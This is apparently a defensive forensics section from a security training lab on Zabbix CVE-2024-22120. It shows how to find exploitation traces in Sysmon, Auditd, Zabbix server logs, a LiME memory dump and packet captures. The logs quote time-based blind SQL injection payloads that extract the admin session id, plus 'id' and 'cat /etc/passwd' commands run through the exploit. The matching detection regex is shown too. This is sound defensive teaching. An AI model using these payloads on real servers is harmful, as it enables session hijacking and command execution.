<p>Exploitation attempts of the <code>CVE-2024-22120</code> vulnerability can be detected by analyzing logs and network traffic for indicators of compromise, among other methods. This section provides guidance on utilizing Sysmon logs, Auditd logs, Zabbix logs, and captured network traffic within the Linux Purple Module target to conduct forensic analysis and identify evidence of exploitation related to <code>CVE-2024-22120</code>.</p>
<p>Ensure that the target has sufficient lifetime to conduct the forensic analysis effectively. If the target&#39;s lifetime is insufficient, extend it as necessary before proceeding.</p>
<p>\
Once the attack part has been completed and the target&#39;s lifetime has been confirmed or extended, connect to the Linux Purple Module target to perform the forensic analysis.\</p>
<p><strong>Sysmon Log Analysis</strong></p>
<p>On Linux systems, monitoring Sysmon Event ID <code>1</code> (SYSMONEVENT_CREATE_PROCESS) can help identify unexpected processes initiated by Zabbix.</p>
<p>Sysmon logs on Linux are typically located at <code>/var/log/syslog</code>. To monitor for unexpected processes initiated by Zabbix, log into the Linux Purple module target (Zabbix host) via SSH and use the following command:</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@ubuntu:~<span class="hljs-meta"># cat /var/log/syslog | /opt/sysmon/sysmonLogView -e 1 -f User=zabbix</span>
<span class="hljs-params">&lt;SNIP&gt;</span>
Event SYSMONEVENT_CREATE_PROCESS
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-27</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03.925</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-20</span>f7<span class="hljs-number">-6747</span><span class="hljs-number">-95</span>a9-d92b35560000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">2981</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>bin/dash
<span class="hljs-symbol">    FileVersion:</span> -
<span class="hljs-symbol">    Description:</span> -
<span class="hljs-symbol">    Product:</span> -
<span class="hljs-symbol">    Company:</span> -
<span class="hljs-symbol">    OriginalFileName:</span> -
<span class="hljs-symbol">    CommandLine:</span> sh -c id
<span class="hljs-symbol">    CurrentDirectory:</span> /
<span class="hljs-symbol">    User:</span> zabbix
<span class="hljs-symbol">    LogonGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-7200</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    LogonId:</span> <span class="hljs-number">114</span>
<span class="hljs-symbol">    TerminalSessionId:</span> <span class="hljs-number">4294967295</span>
<span class="hljs-symbol">    IntegrityLevel:</span> no level
<span class="hljs-symbol">    Hashes:</span> SHA256=<span class="hljs-number">4f</span>291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
<span class="hljs-symbol">    ParentProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ParentProcessId:</span> <span class="hljs-number">1557</span>
<span class="hljs-symbol">    ParentImage:</span> -
<span class="hljs-symbol">    ParentCommandLine:</span> -
<span class="hljs-symbol">    ParentUser:</span> -
Event SYSMONEVENT_CREATE_PROCESS
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-27</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03.926</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-20</span>f7<span class="hljs-number">-6747</span>-a1f8<span class="hljs-number">-8</span>ab8c2550000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">2982</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>bin/id
<span class="hljs-symbol">    FileVersion:</span> -
<span class="hljs-symbol">    Description:</span> -
<span class="hljs-symbol">    Product:</span> -
<span class="hljs-symbol">    Company:</span> -
<span class="hljs-symbol">    OriginalFileName:</span> -
<span class="hljs-symbol">    CommandLine:</span> id
<span class="hljs-symbol">    CurrentDirectory:</span> /
<span class="hljs-symbol">    User:</span> zabbix
<span class="hljs-symbol">    LogonGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-7200</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    LogonId:</span> <span class="hljs-number">114</span>
<span class="hljs-symbol">    TerminalSessionId:</span> <span class="hljs-number">4294967295</span>
<span class="hljs-symbol">    IntegrityLevel:</span> no level
<span class="hljs-symbol">    Hashes:</span> SHA256=<span class="hljs-number">301882f</span>aeaa476b0ce2d2bbc4e6217e494d4d768efa6d38464bf5ca366f40104
<span class="hljs-symbol">    ParentProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-20</span>f7<span class="hljs-number">-6747</span><span class="hljs-number">-95</span>a9-d92b35560000}
<span class="hljs-symbol">    ParentProcessId:</span> <span class="hljs-number">2981</span>
<span class="hljs-symbol">    ParentImage:</span> <span class="hljs-meta-keyword">/usr/</span>bin/dash
<span class="hljs-symbol">    ParentCommandLine:</span> sh
<span class="hljs-symbol">    ParentUser:</span> zabbix
Event SYSMONEVENT_CREATE_PROCESS
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-27</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">52.807</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-2128</span><span class="hljs-number">-6747</span><span class="hljs-number">-95</span>b9-c020ab550000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">2986</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>bin/dash
<span class="hljs-symbol">    FileVersion:</span> -
<span class="hljs-symbol">    Description:</span> -
<span class="hljs-symbol">    Product:</span> -
<span class="hljs-symbol">    Company:</span> -
<span class="hljs-symbol">    OriginalFileName:</span> -
<span class="hljs-symbol">    CommandLine:</span> sh -c cat <span class="hljs-meta-keyword">/etc/</span>passwd
<span class="hljs-symbol">    CurrentDirectory:</span> /
<span class="hljs-symbol">    User:</span> zabbix
<span class="hljs-symbol">    LogonGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-7200</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    LogonId:</span> <span class="hljs-number">114</span>
<span class="hljs-symbol">    TerminalSessionId:</span> <span class="hljs-number">4294967295</span>
<span class="hljs-symbol">    IntegrityLevel:</span> no level
<span class="hljs-symbol">    Hashes:</span> SHA256=<span class="hljs-number">4f</span>291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
<span class="hljs-symbol">    ParentProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ParentProcessId:</span> <span class="hljs-number">1566</span>
<span class="hljs-symbol">    ParentImage:</span> -
<span class="hljs-symbol">    ParentCommandLine:</span> -
<span class="hljs-symbol">    ParentUser:</span> -
Event SYSMONEVENT_CREATE_PROCESS
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-27</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">52.808</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-2128</span><span class="hljs-number">-6747</span><span class="hljs-number">-81</span>fb<span class="hljs-number">-657</span>c56550000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">2987</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>bin/cat
<span class="hljs-symbol">    FileVersion:</span> -
<span class="hljs-symbol">    Description:</span> -
<span class="hljs-symbol">    Product:</span> -
<span class="hljs-symbol">    Company:</span> -
<span class="hljs-symbol">    OriginalFileName:</span> -
<span class="hljs-symbol">    CommandLine:</span> cat <span class="hljs-meta-keyword">/etc/</span>passwd
<span class="hljs-symbol">    CurrentDirectory:</span> /
<span class="hljs-symbol">    User:</span> zabbix
<span class="hljs-symbol">    LogonGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-7200</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    LogonId:</span> <span class="hljs-number">114</span>
<span class="hljs-symbol">    TerminalSessionId:</span> <span class="hljs-number">4294967295</span>
<span class="hljs-symbol">    IntegrityLevel:</span> no level
<span class="hljs-symbol">    Hashes:</span> SHA256=<span class="hljs-number">210f</span>fa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba
<span class="hljs-symbol">    ParentProcessGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-2128</span><span class="hljs-number">-6747</span><span class="hljs-number">-95</span>b9-c020ab550000}
<span class="hljs-symbol">    ParentProcessId:</span> <span class="hljs-number">2986</span>
<span class="hljs-symbol">    ParentImage:</span> <span class="hljs-meta-keyword">/usr/</span>bin/dash
<span class="hljs-symbol">    ParentCommandLine:</span> sh
<span class="hljs-symbol">    ParentUser:</span> zabbix

<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<p>The logs clearly reveal the execution of the <code>id</code> and <code>cat /etc/passwd</code> commands, which were run through the exploit script earlier under the context of the Zabbix user.</p>
<p><strong>Auditd Log Analysis</strong></p>
<p>In all Linux Purple module targets, Auditd rules are located in <code>/etc/audit/audit.rules</code> (taken from <a href="https://github.com/Neo23x0/auditd/blob/master/audit.rules">here</a>). Several Auditd rules are tagged with <code>recon</code> to capture and log the execution of binaries associated with reconnaissance activities. To monitor for unexpected processes initiated by Zabbix related to reconnaissance activities, it is crucial to first determine Zabbix&#39;s <code>UID</code>, as Auditd logs do not directly include the username. This can be achieved by logging into the Linux Purple module target (Zabbix host) via SSH and executing one of the following commands:</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># id -u zabbix</span>
<span class="hljs-number">114</span>
</code></pre>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># getent passwd zabbix</span>
<span class="hljs-symbol">zabbix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">114</span><span class="hljs-symbol">:</span><span class="hljs-number">120</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/zabbix/</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
</code></pre>
<p>Once Zabbix&#39;s <code>UID</code> is identified, log entries tagged with <code>recon</code> can be filtered using <code>ausearch</code> to isolate relevant events associated with the Zabbix UID:</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@ubuntu:~<span class="hljs-comment"># ausearch -ua 114 -m EXECVE | grep "recon"</span>
<span class="hljs-attr">type=SYSCALL</span> <span class="hljs-attr">msg=audit(1732714743.915:26526):</span> <span class="hljs-attr">arch=c000003e</span> <span class="hljs-attr">syscall=59</span> <span class="hljs-attr">success=yes</span> <span class="hljs-attr">exit=0</span> <span class="hljs-attr">a0=56352bda2730</span> <span class="hljs-attr">a1=56352bda26d8</span> <span class="hljs-attr">a2=56352bda26e8</span> <span class="hljs-attr">a3=8</span> <span class="hljs-attr">items=2</span> <span class="hljs-attr">ppid=2981</span> <span class="hljs-attr">pid=2982</span> <span class="hljs-attr">auid=4294967295</span> <span class="hljs-attr">uid=114</span> <span class="hljs-attr">gid=120</span> <span class="hljs-attr">euid=114</span> <span class="hljs-attr">suid=114</span> <span class="hljs-attr">fsuid=114</span> <span class="hljs-attr">egid=120</span> <span class="hljs-attr">sgid=120</span> <span class="hljs-attr">fsgid=120</span> <span class="hljs-attr">tty=(none)</span> <span class="hljs-attr">ses=4294967295</span> <span class="hljs-attr">comm="id"</span> <span class="hljs-attr">exe="/usr/bin/id"</span> <span class="hljs-attr">subj=unconfined</span> <span class="hljs-attr">key="recon"</span>
</code></pre>
<p>The log clearly reveals the execution of the <code>id</code> command, which was run through the exploit script earlier under the context of the Zabbix user.</p>
<p><strong>Zabbix Log Analysis</strong></p>
<p>Zabbix server logs (located at <code>/var/log/zabbix/zabbix_server.log</code>) can also be reviewed for any suspicious activity. For instance, suspicious SQL queries may be identified within the log file.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@ubuntu:~# <span class="hljs-keyword">cat</span> /var/<span class="hljs-built_in">log</span>/zabbix/zabbix_server.<span class="hljs-built_in">log</span>
<span class="hljs-symbol">&lt;SNIP&gt;</span>
 <span class="hljs-number">1564</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">131943.590</span> slow query: <span class="hljs-number">10.004646</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwx9zl00017gjxq6wv591o',3,'htb-student',1732713573,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),1,1)="</span><span class="hljs-number">0</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwx9zl00017gjxq6wv591o','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1567</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">131944.581</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1562</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132009.612</span> slow query: <span class="hljs-number">10.005261</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwxu2f00047ejx7aro21lq',3,'htb-student',1732713599,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),2,1)="</span><span class="hljs-keyword">b</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwxu2f00047ejx7aro21lq','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1557</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132010.568</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1564</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132011.721</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1564</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132021.724</span> slow query: <span class="hljs-number">10.003532</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwy3ex00047gjx7aro21lq',3,'htb-student',1732713611,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),3,1)="</span><span class="hljs-number">1</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwy3ex00047gjx7aro21lq','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1567</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132021.872</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1566</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132023.184</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1557</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132044.920</span> slow query: <span class="hljs-number">10.005640</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwylb7000779jxd6q8rxar',3,'htb-student',1732713634,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),4,1)="</span><span class="hljs-keyword">a</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwylb7000779jxd6q8rxar','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1557</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132045.068</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1567</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132107.770</span> slow query: <span class="hljs-number">10.002921</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwz2xz00067jjxuj4cgm3s',3,'htb-student',1732713657,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),5,1)="</span><span class="hljs-keyword">b</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwz2xz00067jjxuj4cgm3s','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1566</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132107.918</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found

  <span class="hljs-number">1564</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132127.141</span> slow query: <span class="hljs-number">10.004186</span> sec, <span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,resourcename,resourcetype,recordsetid,details) values ('cm3zwzhw100087gjxlazn0irw',3,'htb-student',1732713677,'7','1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),6,1)="</span><span class="hljs-number">8</span><span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1',10084,'Zabbix server',25,'cm3zwzhw100087gjxlazn0irw','{"</span>script.execute_on<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">2</span><span class="hljs-string">"],"</span>script.hostid<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-number">10084</span><span class="hljs-string">"],"</span>script.<span class="hljs-keyword">command</span><span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span>/usr/bin/traceroute <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">"],"</span>script.error<span class="hljs-string">":["</span><span class="hljs-built_in">add</span><span class="hljs-string">","</span><span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found\\n<span class="hljs-string">"]}')"</span>
  <span class="hljs-number">1557</span>:<span class="hljs-number">20241127</span>:<span class="hljs-number">132127.290</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"/usr/bin/traceroute 127.0.0.1"</span>: <span class="hljs-keyword">sh</span>: <span class="hljs-number">1</span>: /usr/bin/traceroute: not found
<span class="hljs-symbol">&lt;SNIP&gt;</span>
</code></pre>
<p>The log clearly reveals the execution of SQL queries matching the format used by the exploit script referenced earlier.</p>
<p><strong>Memory Analysis</strong></p>
<p>Capturing memory with <code>LiME</code> can be performed as follows once the attack part has concluded.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cd /</span>root<span class="hljs-regexp">/LiME/</span>src/
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo insmod lime-5.15.0-71-generic.ko "path=/</span>tmp/dump.mem format=lime<span class="hljs-string">"</span>
</code></pre>
<p>The memory dump will be saved in the following location: <code>/tmp/dump.mem</code></p>
<p>Using the following command, we can identify traces of <code>(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\\&quot;%c\\&quot;) THEN sleep(%d) ELSE sleep(%d) END)</code> (taken from the aforementioned exploit sciprt) within the dumped memory.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@ubuntu</span>:/tmp<span class="hljs-meta"># strings dump.mem | grep -E <span class="hljs-string">"\(select CASE WHEN \(substr\(\(select sessionid from sessions where userid=1 limit 1\),[0-9]+,1\)=\\\\\"</span>.\\\\\<span class="hljs-string">") THEN sleep\([0-9]+\) ELSE sleep\([0-9]+\) END\)"</span></span>
{<span class="hljs-string">"request"</span>: <span class="hljs-string">"command"</span>, <span class="hljs-string">"sid"</span>: <span class="hljs-string">"f9fea16d67bdf584640d1598f49a5dd7"</span>, <span class="hljs-string">"scriptid"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"clientip"</span>: <span class="hljs-string">"1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),31,1)=\"</span><span class="hljs-number">0</span>\<span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1"</span>, <span class="hljs-string">"hostid"</span>: <span class="hljs-string">"10084"</span>}
{<span class="hljs-string">"request"</span>: <span class="hljs-string">"command"</span>, <span class="hljs-string">"sid"</span>: <span class="hljs-string">"f9fea16d67bdf584640d1598f49a5dd7"</span>, <span class="hljs-string">"scriptid"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"clientip"</span>: <span class="hljs-string">"1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),28,1)=\"</span><span class="hljs-number">3</span>\<span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1"</span>, <span class="hljs-string">"hostid"</span>: <span class="hljs-string">"10084"</span>}
{<span class="hljs-string">"request"</span>: <span class="hljs-string">"command"</span>, <span class="hljs-string">"sid"</span>: <span class="hljs-string">"f9fea16d67bdf584640d1598f49a5dd7"</span>, <span class="hljs-string">"scriptid"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"clientip"</span>: <span class="hljs-string">"1' + (select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),28,1)=\"</span><span class="hljs-number">1</span>\<span class="hljs-string">") THEN sleep(10) ELSE sleep(1) END)+ '1"</span>, <span class="hljs-string">"hostid"</span>: <span class="hljs-string">"10084"</span>}
&lt;SNIP&gt;
</code></pre>
<p><strong>Traffic Analysis</strong></p>
<p>To analyze network traffic related to the attack, we can leverage the automatic traffic capturing that is configured to occur on all Linux Purple module targets at boot. The traffic capture files can be accessed as follows:</p>
<ol>
<li>Once the attack part is complete, connect to the Linux Purple module target (Zabbix host) via SSH.</li>
<li>Stop the <code>tcpdump</code> service to halt packet capturing and safely access the <code>.pcap</code> files by using the command:</li>
</ol>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># sudo systemctl stop tcpdump.service</span>
</code></pre>
<ol>
<li>Access the <code>.pcap</code> files in the <code>/tmp</code> directory, which are named based on the timestamp of when the capture started, allowing easy identification of the relevant file.</li>
<li>From inside Pwnbox, download the <code>.pcap</code> files securely using SCP with the command:</li>
</ol>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp root@&lt;Target_IP&gt;:/root/htb/tcp_dump_2024<span class="hljs-string">-11</span><span class="hljs-string">-19</span><span class="hljs-string">-08</span>:39:47.pcap .
root@Target_IP's password: 
tcp_dump_2024<span class="hljs-string">-11</span><span class="hljs-string">-19</span><span class="hljs-string">-08</span>:39:47.pcap 
100% 6205KB   1.6MB/s   00:03
</code></pre>
<p><strong>Inspecting TCP Traffic in Wireshark</strong></p>
<p>The downloaded <code>.pcap</code> file can be analyzed in Wireshark as follows:</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wireshark tcp_dump_2024-<span class="hljs-number">11</span>-<span class="hljs-number">19</span>-<span class="hljs-number">08</span>\:<span class="hljs-number">39</span>\:<span class="hljs-number">47</span>.pcap 
